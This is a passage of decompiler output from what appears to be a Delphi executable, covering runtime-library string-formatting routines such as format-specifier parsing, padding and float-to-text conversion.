{
  int v4; // ebx
  __int16 v8[32]; // [esp+0h] [ebp-54h] BYREF
  __int16 *v9; // [esp+40h] [ebp-14h] BYREF
  char v10; // [esp+44h] [ebp-10h]

  v4 = a3;
  if ( a3 > 0x1F )
    v4 = 31;
  if ( (unsigned __int8)sub_41B4CC(a2, v4 - 1) == 1 )
    --v4;
  unknown_libname_77(v8, a2, v4);
  v8[v4] = 0;
  v9 = v8;
  v10 = 10;
  return sub_414840((int)off_466420[a1], (int)&v9, 0, a4);
}
// 4158F0: using guessed type int __fastcall unknown_libname_77(_DWORD, _DWORD, _DWORD);
// 466420: using guessed type int **off_466420[2];
// 415ACC: using guessed type __int16 var_54[32];

//----- (00415B28) --------------------------------------------------------
int __fastcall sub_415B28(_WORD *a1, unsigned int a2, unsigned int a3, unsigned int a4, int a5, int a6)
{
  return sub_415B48(a1, a2, a3, a4, a5, a6, (int)&unk_46C698);
}

//----- (00415B48) --------------------------------------------------------
int __fastcall sub_415B48(_WORD *a1, unsigned int a2, unsigned int a3, unsigned int a4, int a5, int a6, int a7)
{
  return sub_415F48(a1, a2, a3, a4, a5, a6, a7);
}

//----- (00415B68) --------------------------------------------------------
_WORD *__fastcall sub_415B68(_WORD *a1, unsigned int a2, unsigned int a3, int a4, int a5)
{
  return sub_415B84(a1, a2, a3, a4, a5, (int)&unk_46C698);
}

//----- (00415B84) --------------------------------------------------------
_WORD *__fastcall sub_415B84(_WORD *a1, unsigned int a2, unsigned int a3, int a4, int a5, int a6)
{
  int v8; // eax

  if ( !a1 || !a3 )
    return 0;
  v8 = sub_407124(a3);
  a1[sub_415F48(a1, a2, a3, v8, a4, a5, a6)] = 0;
  return a1;
}

//----- (00415BD0) --------------------------------------------------------
int __stdcall sub_415BD0(int a1)
{
  return unknown_libname_78(a1, &unk_46C698);
}
// 415BF8: using guessed type _DWORD __stdcall unknown_libname_78(_DWORD, _DWORD);

//----- (00415C10) --------------------------------------------------------
_DWORD *__fastcall sub_415C10(int *a1, unsigned int a2, int a3, int a4, int a5)
{
  int v6; // ebx
  int v7; // eax
  unsigned int v8; // eax
  int v9; // eax
  int v10; // ecx
  unsigned int v11; // esi
  _WORD *v12; // eax
  int v14; // [esp-14h] [ebp-2020h]
  _WORD v15[4096]; // [esp+0h] [ebp-200Ch] BYREF
  int v16; // [esp+2000h] [ebp-Ch]
  int v17; // [esp+2004h] [ebp-8h]
  unsigned int v18; // [esp+2008h] [ebp-4h]

  v17 = a3;
  v18 = a2;
  v6 = 4096;
  v7 = a2;
  if ( a2 )
    v7 = *(_DWORD *)(a2 - 4);
  if ( v7 >= 3072 )
  {
    v9 = a2;
    if ( a2 )
      v9 = *(_DWORD *)(a2 - 4);
    v6 = v9;
    v16 = v9;
  }
  else
  {
    v8 = a2;
    if ( a2 )
      v8 = *(_DWORD *)(a2 - 4);
    v16 = sub_415B48(v15, 0xFFFu, v18, v8, v17, a4, a5);
  }
  if ( v6 - 1 > v16 )
    return sub_406D90(a1, v15, v16);
  while ( v6 - 1 <= v16 )
  {
    v6 *= 2;
    sub_406C44(a1);
    sub_407890(a1, v6, v10);
    v11 = v18;
    if ( v18 )
      v11 = *(_DWORD *)(v18 - 4);
    v14 = v17;
    v12 = (_WORD *)sub_407790(*a1);
    v16 = sub_415B48(v12, v6 - 1, v18, v11, v14, a4, a5);
  }
  return sub_407890(a1, v16, a3);
}
// 415CA5: variable 'v10' is possibly undefined
// 415CE5: variable 'a3' is possibly undefined
// 415C10: using guessed type _WORD var_200C[4096];

//----- (00415D08) --------------------------------------------------------
int __usercall sub_415D08@<eax>(int a1@<eax>, int a2@<edx>, int a3)
{
  int v3; // ecx
  int v4; // edx
  int v5; // eax
  bool v6; // cc
  int v7; // eax
  int v8; // eax

  v3 = 0;
  if ( a1 < *(_DWORD *)(a3 - 4) && *(_WORD *)(a3 - 6) != 83 )
    a1 = *(_DWORD *)(a3 - 4);
  if ( *(_DWORD *)(a3 - 12) != -1 && *(_DWORD *)(a3 - 12) > a2 + a1 )
  {
    v4 = a2 + a1 + 1;
    v5 = *(_DWORD *)(a3 - 12);
    v6 = v5 < v4;
    v7 = v5 - v4;
    if ( !v6 )
    {
      v8 = v7 + 1;
      while ( *(_DWORD *)(a3 - 16) )
      {
        **(_WORD **)(a3 - 20) = 32;
        *(_DWORD *)(a3 - 20) += 2;
        *(_DWORD *)(a3 - 16) -= 2;
        if ( !--v8 )
          return v3;
      }
      LOBYTE(v3) = 1;
    }
  }
  return v3;
}

//----- (00415D7C) --------------------------------------------------------
int __usercall sub_415D7C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4)
{
  int v6; // esi
  int v7; // edx
  bool v8; // cc
  int v9; // edx
  int v10; // eax
  unsigned int v11; // eax
  int v12; // edi
  int v14; // [esp+Ch] [ebp-10h]
  _WORD *v15; // [esp+10h] [ebp-Ch]
  unsigned int v16; // [esp+14h] [ebp-8h]

  v15 = (_WORD *)a1;
  if ( a1 )
  {
    if ( a3 == -1 )
      v6 = sub_407124(a1);
    else
      v6 = a3;
  }
  else
  {
    v6 = 0;
  }
  if ( a2 > -1 && a2 < v6 )
    v6 = a2;
  v16 = 2 * v6;
  if ( a1 && *v15 == 45 && *(_WORD *)(a4 - 6) != 83 )
  {
    v16 -= 2;
    --v6;
    v14 = 1;
  }
  else
  {
    v14 = 0;
  }
  if ( *(_BYTE *)(a4 - 21) || (a2 = sub_415D08(v6, v14, a4), !(_BYTE)a2) )
  {
    if ( v14 == 1 )
    {
      if ( !*(_DWORD *)(a4 - 16) )
      {
        LOBYTE(a2) = 1;
        return a2;
      }
      ++v15;
      **(_WORD **)(a4 - 20) = 45;
      *(_DWORD *)(a4 - 20) += 2;
      *(_DWORD *)(a4 - 16) -= 2;
    }
    if ( *(_DWORD *)(a4 - 4) == -1
      || v6 >= *(_DWORD *)(a4 - 4)
      || *(_WORD *)(a4 - 6) == 83
      || (v7 = *(_DWORD *)(a4 - 4), v8 = v7 < v6 + 1, v9 = v7 - (v6 + 1), v8) )
    {
LABEL_28:
      if ( a1 )
      {
        v11 = *(_DWORD *)(a4 - 16);
        LOBYTE(a2) = v11 < v16;
        if ( v11 >= v16 )
          v12 = v16;
        else
          v12 = *(_DWORD *)(a4 - 16);
        System::Move(v15, *(void **)(a4 - 20), v12);
        *(_DWORD *)(a4 - 20) += v12;
        *(_DWORD *)(a4 - 16) -= v12;
      }
      else
      {
        a2 = 0;
      }
      if ( *(_BYTE *)(a4 - 21) )
        return sub_415D08(v6, v14, a4);
    }
    else
    {
      v10 = v9 + 1;
      while ( *(_DWORD *)(a4 - 16) )
      {
        **(_WORD **)(a4 - 20) = 48;
        *(_DWORD *)(a4 - 20) += 2;
        *(_DWORD *)(a4 - 16) -= 2;
        if ( !--v10 )
          goto LABEL_28;
      }
      LOBYTE(a2) = 1;
    }
  }
  return a2;
}

//----- (00415EFC) --------------------------------------------------------
_DWORD *__fastcall sub_415EFC(_DWORD *a1, _DWORD *a2)
{
  _DWORD *result; // eax
  int v4; // edx
  int v5; // ecx
  _DWORD v6[4]; // [esp+Ch] [ebp-10h] BYREF

  v6[0] = *a1;
  v6[1] = a1[1];
  v6[2] = a1[2];
  v6[3] = a1[3];
  result = sub_406C44(a2);
  if ( LOWORD(v6[0]) != 1 )
  {
    if ( !*(_DWORD *)off_467EF8 )
      sub_404ED0(16, v4, v5);
    return (_DWORD *)(*(int (__fastcall **)(_DWORD *, _DWORD *))off_467EF8)(a2, v6);
  }
  return result;
}
// 415F3B: variable 'v4' is possibly undefined
// 415F3B: variable 'v5' is possibly undefined
// 467EF8: using guessed type void *off_467EF8;
// 415EFC: using guessed type _DWORD var_10[4];

//----- (00415F48) --------------------------------------------------------
int __fastcall sub_415F48(_WORD *a1, unsigned int a2, unsigned int a3, unsigned int a4, int a5, int a6, int a7)
{
  int v7; // ebx
  int v8; // edi
  _WORD *v9; // ebx
  unsigned int v10; // esi
  _WORD *v11; // ebx
  int v12; // ecx
  int v13; // edx
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // eax
  int v18; // eax
  int v19; // eax
  int v20; // eax
  int v22[2]; // [esp-Ch] [ebp-108h] BYREF
  int *v23; // [esp-4h] [ebp-100h]
  int v24; // [esp+Ch] [ebp-F0h] BYREF
  int v25; // [esp+10h] [ebp-ECh] BYREF
  int v26; // [esp+14h] [ebp-E8h] BYREF
  int v27; // [esp+18h] [ebp-E4h] BYREF
  int v28; // [esp+1Ch] [ebp-E0h] BYREF
  int System__AnsiString; // [esp+20h] [ebp-DCh] BYREF
  __int16 v30[65]; // [esp+26h] [ebp-D6h] BYREF
  _DWORD *v31; // [esp+A8h] [ebp-54h]
  int v32; // [esp+ACh] [ebp-50h]
  _DWORD *v33; // [esp+B0h] [ebp-4Ch]
  bool v34; // [esp+B7h] [ebp-45h]
  _DWORD *v35; // [esp+B8h] [ebp-44h]
  int v36; // [esp+BCh] [ebp-40h]
  int v37; // [esp+C0h] [ebp-3Ch] BYREF
  unsigned int v38; // [esp+C4h] [ebp-38h]
  char v39; // [esp+CBh] [ebp-31h]
  int v40; // [esp+CCh] [ebp-30h]
  void *v41; // [esp+D0h] [ebp-2Ch]
  unsigned int v42; // [esp+D4h] [ebp-28h]
  unsigned int v43; // [esp+D8h] [ebp-24h]
  _WORD *v44; // [esp+DCh] [ebp-20h]
  int v45; // [esp+E0h] [ebp-1Ch] BYREF
  char v46; // [esp+E7h] [ebp-15h]
  _WORD *v47; // [esp+E8h] [ebp-14h]
  unsigned int v48; // [esp+ECh] [ebp-10h]
  int v49; // [esp+F0h] [ebp-Ch] BYREF
  __int16 v50; // [esp+F6h] [ebp-6h]
  int v51; // [esp+F8h] [ebp-4h] BYREF
  int savedregs; // [esp+FCh] [ebp+0h] BYREF

  v24 = 0;
  v25 = 0;
  v26 = 0;
  v27 = 0;
  v28 = 0;
  System__AnsiString = 0;
  v45 = 0;
  v42 = a3;
  v43 = a2;
  v44 = a1;
  v23 = &savedregs;
  v22[1] = (int)&loc_4168F5;
  v22[0] = (int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v22);
  if ( a1 && v42 )
  {
    v8 = -1;
    v40 = a6 + 1;
    v47 = a1;
    v9 = (_WORD *)v42;
    if ( v43 >= 0x7FFFFFFF )
      v48 = v43;
    else
      v48 = 2 * v43;
    v10 = v42 + 2 * a4;
    if ( v10 <= v42 )
    {
LABEL_154:
      v7 = v47 - v44;
      goto LABEL_155;
    }
    while ( 1 )
    {
      if ( *v9 == 37 )
      {
        v11 = v9 + 1;
        if ( v10 <= (unsigned int)v11 )
          goto LABEL_154;
        if ( *v11 == 37 )
        {
          if ( !v48 )
            sub_415ACC(0, v42, a4, (int)&savedregs);
          *v47 = *v11;
          v9 = v11 + 1;
          ++v47;
          v48 -= 2;
        }
        else
        {
          v49 = -1;
          ++v8;
          if ( sub_411C18(v11) )
          {
            v41 = v11;
            while ( v10 > (unsigned int)v11 && sub_411C18(v11) )
              ++v11;
            if ( v11 != v41 )
            {
              sub_415900(v30, v41, ((char *)v11 - (_BYTE *)v41) / 2);
              unknown_libname_51(&System__AnsiString, v30, 65);
              if ( !(unsigned __int8)Sysutils::TryStrToInt(System__AnsiString, &v37) )
                sub_415ACC(0, v42, a4, (int)&savedregs);
              if ( *v11 == 58 )
              {
                ++v11;
                v8 = v37;
              }
              else
              {
                v49 = v37;
              }
            }
          }
          else if ( *v11 == 58 )
          {
            v8 = 0;
            ++v11;
          }
          if ( *v11 == 45 )
          {
            v46 = 1;
            ++v11;
          }
          else
          {
            v46 = 0;
          }
          v41 = v11;
          if ( *v11 == 42 )
          {
            v49 = -2;
            ++v11;
          }
          else if ( sub_411C18(v11) )
          {
            while ( v10 > (unsigned int)v11 && sub_411C18(v11) )
              ++v11;
            if ( v11 != v41 )
            {
              sub_415900(v30, v41, ((char *)v11 - (_BYTE *)v41) / 2);
              unknown_libname_51(&v28, v30, 65);
              if ( !(unsigned __int8)Sysutils::TryStrToInt(v28, &v49) )
                sub_415ACC(0, v42, a4, (int)&savedregs);
            }
          }
          if ( *v11 == 46 )
          {
            if ( v10 <= (unsigned int)++v11 )
              goto LABEL_154;
            if ( *v11 == 42 )
            {
              v51 = -2;
              ++v11;
            }
            else
            {
              v41 = v11;
              while ( v10 > (unsigned int)v11 && sub_411C18(v11) )
                ++v11;
              sub_415900(v30, v41, ((char *)v11 - (_BYTE *)v41) / 2);
              unknown_libname_51(&v27, v30, 65);
              if ( !(unsigned __int8)Sysutils::TryStrToInt(v27, &v51) )
                v51 = -1;
            }
          }
          else
          {
            v51 = -1;
          }
          if ( !sub_411BC4(v11) )
            goto LABEL_154;
          if ( (unsigned __int16)(*v11 - 97) >= 0x1Au )
            v50 = *v11;
          else
            v50 = *v11 ^ 0x20;
          v9 = v11 + 1;
          if ( v49 == -2 )
          {
            if ( v8 >= v40 )
              sub_415ACC(1, v42, a4, (int)&savedregs);
            if ( *(_BYTE *)(a5 + 8 * v8 + 4) )
            {
              sub_415ACC(0, v42, a4, (int)&savedregs);
            }
            else
            {
              if ( v8 >= v40 )
                sub_415ACC(1, v42, a4, (int)&savedregs);
              v49 = *(_DWORD *)(a5 + 8 * v8);
              if ( v49 < 0 )
              {
                v46 ^= 1u;
                v49 = -v49;
              }
              ++v8;
            }
          }
          if ( v51 == -2 )
          {
            if ( v8 >= v40 )
              sub_415ACC(1, v42, a4, (int)&savedregs);
            if ( *(_BYTE *)(a5 + 8 * v8 + 4) )
            {
              sub_415ACC(0, v42, a4, (int)&savedregs);
            }
            else
            {
              if ( v8 >= v40 )
                sub_415ACC(1, v42, a4, (int)&savedregs);
              v51 = *(_DWORD *)(a5 + 8 * v8++);
            }
          }
          if ( v8 >= v40 )
            sub_415ACC(1, v42, a4, (int)&savedregs);
          v35 = *(_DWORD **)(a5 + 8 * v8);
          v13 = *(_DWORD *)(a5 + 8 * v8 + 4);
          v36 = v13;
          v39 = 0;
          switch ( (char)v13 )
          {
            case 0:
              if ( v51 > 16 || v51 == -1 )
                v51 = 0;
              switch ( v50 )
              {
                case 'D':
                  sub_415150((signed int)v35, &v45);
                  break;
                case 'U':
                  unknown_libname_74(v35, &v45);
                  break;
                case 'X':
                  sub_4154B0((unsigned int)v35, 0, &v45);
                  break;
                default:
                  goto LABEL_82;
              }
              goto LABEL_86;
            case 1:
            case 7:
            case 8:
            case 14:
              goto LABEL_147;
            case 2:
            case 9:
              if ( v50 != 83 )
                goto LABEL_147;
              if ( (_BYTE)v36 == 2 )
                unknown_libname_48(&v45, (unsigned __int8)v35);
              else
                unknown_libname_48(&v45, (unsigned __int16)v35);
              v15 = sub_407790(v45);
              v39 = sub_415D7C(v15, v51, -1, (int)&savedregs);
              break;
            case 3:
            case 12:
              v34 = (_BYTE)v36 != 3;
              v38 = 0;
              if ( v50 == 71 || v50 == 69 )
              {
                if ( (unsigned int)v51 > 0x12 )
                  v51 = 15;
              }
              else if ( (unsigned int)v51 > 0x12 )
              {
                v51 = 2;
                if ( v50 == 77 )
                  v51 = *(unsigned __int8 *)(a7 + 5);
              }
              switch ( v50 )
              {
                case 'E':
                  v38 = sub_41698C((char *)v30, (int)v35, v34, 1u, v51, 3, a7);
                  break;
                case 'F':
                  v38 = sub_41698C((char *)v30, (int)v35, v34, 2u, 18, v51, a7);
                  break;
                case 'G':
                  v38 = sub_41698C((char *)v30, (int)v35, v34, 0, v51, 3, a7);
                  break;
                case 'M':
                  v38 = sub_41698C((char *)v30, (int)v35, v34, 4u, 18, v51, a7);
                  break;
                case 'N':
                  v38 = sub_41698C((char *)v30, (int)v35, v34, 3u, 18, v51, a7);
                  break;
                default:
                  sub_415ACC(0, v42, a4, (int)&savedregs);
                  break;
              }
              v30[v38] = 0;
              v51 = 0;
              v39 = sub_415D7C((int)v30, -1, -1, (int)&savedregs);
              break;
            case 4:
              if ( v50 != 83 )
                goto LABEL_147;
              unknown_libname_52(&v25, v35);
              v18 = sub_407790(v25);
              v39 = sub_415D7C(v18, v51, -1, (int)&savedregs);
              break;
            case 5:
              if ( v50 != 80 )
                goto LABEL_147;
              sub_4154B0((unsigned int)v35, 8, &v45);
              v16 = sub_407790(v45);
              v39 = sub_415D7C(v16, -1, -1, (int)&savedregs);
              break;
            case 6:
              if ( v50 != 83 )
                goto LABEL_147;
              unknown_libname_49(&v26, v35);
              v17 = sub_407790(v26);
              v39 = sub_415D7C(v17, v51, -1, (int)&savedregs);
              break;
            case 10:
              if ( v50 != 83 )
                goto LABEL_147;
              v39 = sub_415D7C((int)v35, v51, -1, (int)&savedregs);
              break;
            case 11:
              if ( v50 != 83 )
                goto LABEL_147;
              sub_407840(&v45, (int)v35, v22[0]);
              v32 = v45;
              if ( v45 )
                v32 = *(_DWORD *)(v32 - 4);
              v19 = sub_407790(v45);
              v39 = sub_415D7C(v19, v51, v32, (int)&savedregs);
              break;
            case 13:
              if ( v50 != 83 )
                goto LABEL_147;
              sub_415EFC(v35, &v24);
              v20 = sub_407790(v24);
              v39 = sub_415D7C(v20, v51, -1, (int)&savedregs);
              break;
            case 15:
              if ( v50 != 83 )
                goto LABEL_147;
              v33 = v35;
              if ( v35 )
                v33 = (_DWORD *)(*(v33 - 1) >> 1);
              v39 = sub_415D7C((int)v35, v51, (int)v33, (int)&savedregs);
              break;
            case 16:
              if ( v51 > 32 || v51 == -1 )
                v51 = 0;
              switch ( v50 )
              {
                case 'D':
                  sub_415178(&v45, v13, v12, *(_QWORD *)v35);
                  break;
                case 'U':
                  unknown_libname_75(*v35, v35[1]);
                  break;
                case 'X':
                  sub_4154C8(0, &v45, *(_QWORD *)v35);
                  break;
                default:
LABEL_82:
                  sub_415ACC(0, v42, a4, (int)&savedregs);
                  break;
              }
LABEL_86:
              v14 = sub_407790(v45);
              v39 = sub_415D7C(v14, -1, -1, (int)&savedregs);
              break;
            case 17:
              if ( v50 == 83 )
              {
                v31 = v35;
                if ( v35 )
                  v31 = (_DWORD *)*(v31 - 1);
                v39 = sub_415D7C((int)v35, v51, (int)v31, (int)&savedregs);
              }
              else
              {
LABEL_147:
                sub_415ACC(0, v42, a4, (int)&savedregs);
              }
              break;
            default:
              break;
          }
          if ( v39 )
          {
            v7 = v47 - v44;
            goto LABEL_155;
          }
        }
      }
      else
      {
        if ( !v48 )
        {
          v7 = v47 - v44;
          goto LABEL_155;
        }
        *v47++ = *v9++;
        v48 -= 2;
      }
      if ( v10 <= (unsigned int)v9 )
        goto LABEL_154;
    }
  }
  v7 = 0;
LABEL_155:
  __writefsdword(0, v22[0]);
  v23 = (int *)&loc_4168FC;
  sub_406CA4((int)&v24, 6);
  sub_406C44(&v45);
  return v7;
}
// 4167E2: variable 'v12' is possibly undefined
// 4077A8: using guessed type int __fastcall unknown_libname_48(_DWORD, _DWORD);
// 4077B8: using guessed type int __fastcall unknown_libname_49(_DWORD, _DWORD);
// 407824: using guessed type int __fastcall unknown_libname_51(_DWORD, _DWORD, _DWORD);
// 407884: using guessed type int __fastcall unknown_libname_52(_DWORD, _DWORD);
// 4151BC: using guessed type int __fastcall unknown_libname_74(_DWORD, _DWORD);
// 4151D0: using guessed type _DWORD __stdcall unknown_libname_75(_DWORD, _DWORD);
// 415F48: using guessed type int var_1C;

//----- (00416908) --------------------------------------------------------
int __usercall sub_416908@<eax>(__int16 a1@<ax>, int a2@<edx>, int a3@<ecx>, int a4@<ebx>, _BYTE *a5@<edi>)
{
  char *v5; // edi
  char v6; // al
  unsigned int v7; // eax
  int *v8; // ebx
  unsigned int v9; // et2
  int *v10; // edx
  char v11; // ch
  int *v13; // [esp-Ch] [ebp-10h]
  int v14; // [esp-8h] [ebp-Ch] BYREF
  int v15; // [esp-4h] [ebp-8h]

  *a5 = a1;
  v5 = a5 + 1;
  if ( BYTE1(a4) )
    *v5++ = 0;
  if ( (_BYTE)a4 )
  {
    if ( a2 < 0 )
    {
      v6 = 45;
      a2 = -a2;
      goto LABEL_9;
    }
  }
  else
  {
    a2 = 0;
  }
  if ( !HIBYTE(a1) )
    goto LABEL_11;
  v6 = HIBYTE(a1);
LABEL_9:
  *v5++ = v6;
  if ( BYTE1(a4) )
    *v5++ = 0;
LABEL_11:
  v7 = a2;
  v15 = a2;
  v14 = a4;
  v8 = &v14 - 2;
  v13 = &v14 - 2;
  do
  {
    do
    {
      v9 = v7 % dword_46643C;
      v7 /= (unsigned int)dword_46643C;
      *(_BYTE *)v8 = v9 + 48;
      v8 = (int *)((char *)v8 + 1);
      --a3;
    }
    while ( v7 );
  }
  while ( a3 > 0 );
  v10 = v13;
  v11 = BYTE1(v14);
  do
  {
    v8 = (int *)((char *)v8 - 1);
    *v5++ = *(_BYTE *)v8;
    if ( v11 )
      *v5++ = 0;
  }
  while ( v8 != v10 );
  return v15;
}
// 46643C: using guessed type int dword_46643C;

//----- (0041698C) --------------------------------------------------------
unsigned int __fastcall sub_41698C(char *a1, int a2, char a3, unsigned __int8 a4, int a5, int a6, int a7)
{
  int v7; // eax
  int v8; // eax
  char *v9; // edi
  int v10; // ecx
  _WORD *v11; // esi
  int i; // ecx
  int v13; // ebx
  int v15; // [esp-4h] [ebp-3Ch]
  unsigned __int16 v16; // [esp+Eh] [ebp-2Ah]
  int savedregs; // [esp+38h] [ebp+0h] BYREF
  int v19; // [esp+48h] [ebp+10h]

  v7 = 19;
  if ( !a3 )
  {
    v7 = a5;
    if ( a5 < 2 )
      v7 = 2;
    if ( v7 > 18 )
      v7 = 18;
  }
  v19 = v7;
  v15 = v7;
  v8 = 9999;
  if ( a4 >= 2u )
    v8 = a6;
  Sysutils::FloatToDecimal(v8, v15);
  v9 = a1;
  if ( (unsigned int)v16 - 0x7FFF >= 2 )
  {
    v13 = a4;
    if ( a4 != 1 && (a4 > 4u || (__int16)v16 > v19) )
      LOBYTE(v13) = 0;
    (*(&off_416A7E + v13))();
  }
  else
  {
    sub_416AA9((int)&savedregs, a1);
    v11 = (_WORD *)((char *)sub_416A92 + 6 * v10);
    for ( i = 3; i; --i )
    {
      *(_WORD *)v9 = *v11++;
      v9 += 2;
    }
  }
  return (unsigned int)(v9 - a1) >> 1;
}
// 416A17: variable 'v16' is possibly undefined
// 416A2E: variable 'v10' is possibly undefined
// 416A7E: using guessed type int (*off_416A7E)();
// 416A92: using guessed type int sub_416A92();
// 417020: using guessed type _DWORD __stdcall Sysutils::FloatToDecimal(_DWORD, _DWORD);

//----- (00416A9E) --------------------------------------------------------
char __usercall sub_416A9E@<al>(char *a1@<esi>)
{
  char result; // al

  result = *a1;
  if ( !*a1 )
    return 48;
  return result;
}

//----- (00416AA9) --------------------------------------------------------
__int16 __usercall sub_416AA9@<ax>(int a1@<ebp>, _WORD *a2@<edi>)
{
  __int16 result; // ax

  if ( *(_BYTE *)(a1 - 40) )
  {
    result = 45;
    *a2 = 45;
  }
  return result;
}

//----- (00416AB6) --------------------------------------------------------
char __usercall sub_416AB6@<al>(int a1@<ebp>, _WORD *a2@<edi>, unsigned __int8 *a3@<esi>)
{
  int v3; // eax
  int v4; // ecx
  int v5; // edx
  _WORD *v6; // edi
  int i; // ecx
  unsigned __int8 v8; // al
  int v9; // eax
  __int16 v10; // ax
  unsigned int v11; // ecx
  __int16 v12; // bx

  sub_416AA9(a1, a2);
  v4 = *(__int16 *)(a1 - 42);
  v5 = 0;
  if ( v4 > *(_DWORD *)(a1 + 16) || v4 < -3 )
  {
    v4 = 1;
    v5 = 1;
    do
    {
LABEL_10:
      v8 = *a3++;
      if ( !v8 )
      {
        LOBYTE(v3) = 48;
        while ( v4 )
        {
          *a2++ = 48;
          --v4;
        }
        goto LABEL_19;
      }
      *a2++ = v8;
      --v4;
    }
    while ( v4 );
    LOBYTE(v3) = *a3++;
    if ( !(_BYTE)v3 )
      goto LABEL_19;
    BYTE1(v3) = 0;
    v9 = v3 << 16;
    LOWORD(v9) = *(_WORD *)(a1 - 14);
    *(_DWORD *)a2 = v9;
    a2 += 2;
  }
  else
  {
    if ( v4 > 0 )
      goto LABEL_10;
    LOBYTE(v3) = 48;
    *a2 = 48;
    v6 = a2 + 1;
    if ( !*a3 )
      return v3;
    *v6 = *(_WORD *)(a1 - 14);
    a2 = v6 + 1;
    for ( i = -v4; i; --i )
      *a2++ = 48;
  }
  while ( 1 )
  {
    LOBYTE(v3) = *a3++;
    if ( !(_BYTE)v3 )
      break;
    *a2++ = (unsigned __int8)v3;
  }
LABEL_19:
  if ( v5 )
  {
    HIBYTE(v10) = 0;
    v11 = *(_DWORD *)(a1 + 12);
    if ( v11 > 4 )
      v11 = 0;
    LOBYTE(v10) = 69;
    LOBYTE(v12) = *(_BYTE *)(a1 - 39);
    HIBYTE(v12) = 1;
    LOBYTE(v3) = sub_416908(v10, *(__int16 *)(a1 - 42) - 1, v11, v12, a2);
  }
  return v3;
}
// 416B03: variable 'v3' is possibly undefined

//----- (00416B63) --------------------------------------------------------
char __usercall sub_416B63@<al>(int a1@<ebp>, _WORD *a2@<edi>, char *a3@<esi>)
{
  unsigned int v3; // edx
  int v4; // ecx
  __int16 v5; // ax
  int v6; // ebx
  int v7; // ecx
  __int16 v8; // ax
  __int16 v9; // ax
  int v10; // edx

  sub_416AA9(a1, a2);
  v3 = *(_DWORD *)(a1 + 12);
  if ( v3 >= 0x12 )
    v3 = 18;
  v4 = *(__int16 *)(a1 - 42);
  if ( v4 > 0 )
  {
    v6 = 0;
    if ( *(_BYTE *)(a1 + 20) != 2 )
    {
      LOBYTE(v6) = (unsigned __int16)(v4 - 1) % 3u;
      ++v6;
    }
    while ( 1 )
    {
      LOBYTE(v5) = sub_416A9E(a3);
      *a2++ = v5;
      v4 = v7 - 1;
      if ( !v4 )
        break;
      if ( !--v6 )
      {
        v8 = *(_WORD *)(a1 - 16);
        if ( v8 )
        {
          *a2++ = v8;
          LOBYTE(v6) = 3;
        }
      }
    }
  }
  else
  {
    LOBYTE(v5) = 48;
    *a2++ = 48;
  }
  if ( v3 )
  {
    v9 = *(_WORD *)(a1 - 14);
    if ( v9 )
      *a2++ = v9;
    if ( v4 )
    {
      LOBYTE(v5) = 48;
      while ( 1 )
      {
        *a2++ = 48;
        if ( !--v3 )
          break;
        if ( !++v4 )
          goto LABEL_18;
      }
    }
    else
    {
      do
      {
LABEL_18:
        LOBYTE(v5) = sub_416A9E(a3);
        *a2++ = v5;
      }
      while ( v10 != 1 );
    }
  }
  return v5;
}
// 416B9C: variable 'v5' is possibly undefined
// 416B9E: variable 'v7' is possibly undefined
// 416BB5: variable 'v3' is possibly undefined
// 416BD8: variable 'v10' is possibly undefined

//----- (00416BDB) --------------------------------------------------------
void __usercall sub_416BDB(int a1@<ebp>, _WORD *a2@<edi>)
{
  int v2; // ebx
  __int16 v3; // cx
  unsigned __int8 *v4; // ebx
  int v5; // ecx
  unsigned __int8 v6; // al
  int v7; // [esp-4h] [ebp-4h]

  v2 = *(unsigned __int8 *)(a1 - 17);
  v3 = 3;
  if ( *(_BYTE *)(a1 - 40) )
  {
    LOBYTE(v2) = *(_BYTE *)(a1 - 18);
    v3 = 1039;
  }
  if ( (unsigned __int8)v2 > (unsigned __int8)v3 )
    LOBYTE(v2) = v3;
  LOBYTE(v2) = HIBYTE(v3) + v2;
  v4 = (unsigned __int8 *)sub_416C42 + 5 * v2 + *(_DWORD *)(a1 - 8);
  v5 = 5;
  do
  {
    v6 = *v4;
    if ( *v4 == 64 )
      break;
    v7 = v5;
    if ( v6 == 36 )
    {
      sub_416C32(a1, a2);
    }
    else if ( v6 == 42 )
    {
      ((void (*)(void))loc_416B68)();
    }
    else
    {
      *a2++ = v6;
    }
    ++v4;
    v5 = v7 - 1;
  }
  while ( v7 != 1 );
}

//----- (00416C32) --------------------------------------------------------
void __usercall sub_416C32(int a1@<ebp>, _WORD *a2@<edi>)
{
  _WORD *v2; // esi
  int i; // ecx

  v2 = *(_WORD **)(a1 - 12);
  if ( v2 )
  {
    for ( i = *((_DWORD *)v2 - 1); i; --i )
      *a2++ = *v2++;
  }
}

//----- (00416C42) --------------------------------------------------------
void __usercall sub_416C42(int a1@<eax>, _BYTE *a2@<edx>, _BYTE *a3@<ecx>, int a4@<ebp>)
{
  int v4; // eax

  LOBYTE(a1) = a1 & 0x2A;
  v4 = a1 + 3;
  BYTE1(v4) -= *(_BYTE *)(3 * v4);
  v4 += 2;
  LOBYTE(v4) = v4 & 0x20;
  LOBYTE(v4) = v4 - *(_BYTE *)(v4 + 64);
  BYTE1(v4) -= *(_BYTE *)v4;
  LOBYTE(v4) = v4 & 0x40;
  ++v4;
  a2[a4] -= BYTE1(v4);
  *(_DWORD *)(v4 + 45) -= v4;
  LOBYTE(v4) = v4 & 0x2A;
  v4 += 2;
  LOBYTE(v4) = v4 & 0x2D;
  LOBYTE(v4) = (v4 - *(_BYTE *)(v4 + 64)) & 0x2A;
  v4 -= 707280960;
  LOBYTE(v4) = v4 & 0x29;
  v4 -= 1077945385;
  LOBYTE(v4) = v4 & 0x2D;
  v4 += 2142355380;
  BYTE1(v4) -= *(_BYTE *)v4;
  LOBYTE(v4) = v4 & 0x2D;
  ++v4;
  LOBYTE(v4) = v4 & 0x20;
  BYTE1(a3) = BYTE1(a3) - MEMORY[0x2A404024] - MEMORY[0x2D202440];
  LOBYTE(v4) = v4 - *(_BYTE *)(v4 + 42);
  BYTE1(a3) -= *a3;
  *a2 -= BYTE1(a3);
  a3[a4] &= (unsigned __int16)(v4 - 9248) >> 8;
  JUMPOUT(0x416CA6);
}
// 416CA3: control flows out of bounds to 416CA6

//----- (00416CAC) --------------------------------------------------------
unsigned int __userpurge sub_416CAC@<eax>(int a1@<edx>, char a2@<cl>, __int16 *a3@<esi>, int a4, int a5)
{
  int v6; // ecx
  char v7; // zf
  int v8; // eax
  int v9; // edx
